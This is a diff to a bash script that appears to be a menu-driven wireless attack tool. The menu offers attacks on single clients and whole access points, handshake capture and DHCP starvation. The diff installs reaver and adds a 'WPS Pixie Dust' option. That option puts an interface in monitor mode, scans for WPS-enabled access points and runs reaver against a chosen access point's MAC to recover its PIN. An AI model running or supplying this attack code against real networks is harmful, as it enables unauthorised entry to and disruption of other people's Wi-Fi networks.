@@ -20,6 +20,11 @@ if [ ! -d '/etc/apt' ]
 		echo "WARNING:You appear to not be using a debianesque System! Please review the script to change the needed bits." && sleep 20
 fi
 echo "checking for dependencies.. please wait"
+if [ ! -f '/usr/bin/reaver' ]
+	then
+		echo "loading reaver.."
+		sudo apt install reaver -y > /dev/null
+fi
 if [ ! -f '/usr/bin/aircrack-ng' ]
 	then
 		echo "loading aircrack.."
@@ -67,7 +72,7 @@ tput sgr0
 #opt
 echo "     		 	Choose an attack option:							"
 echo "	[single client(1) whole AP(2) find hidden(3) get handshakes(4)	]"
-echo "	[DHCP starvation attack (5)					]"
+echo "	[DHCP starvation attack (5)	WPS Pixie Dust (6)				]"
 echo "	"
 echo "	"
 echo "	"
@@ -91,7 +96,7 @@ if [ $ask -lt 5 ]
 fi
 clear
 #read interface end
-#main
+#main		
 if [ $ask -eq 2 ] || [ $ask -eq 1 ]
 	then
 		echo "scanning networks.."
@@ -238,4 +243,22 @@ if [ $ask -eq 5 ]
 		echo "The connection is interrupted!"
 		echo "You may be out of reach or DHCP pool has been successfully flooded" 
 		tput sgr0
+fi
+if [ $ask -eq 6 ]
+	then
+		echo "Choose Channel:"
+		read chan
+		echo "Please wait.. monitor mode is being enabled.."
+		trap 'tput setaf 1 && echo "deactivating monitor mode.." && airmon-ng stop $monitor > /dev/null && exit 1' INT
+		sudo airmon-ng start $inter $chan > /dev/null
+		echo "How long should be searched for WPS? [sec]:"
+		read secs
+		echo "scanning networks for WPS availability.."
+		sudo timeout --kill-after=$secs --foreground $secs airodump-ng $monitor --wps
+		echo "MAC of Access-Point:"
+		read macacc
+		echo "loading attack..."
+		tput setaf 1
+		sudo reaver -i $monitor -c $chan -b $macacc -k 1
+		echo "done"
 fi
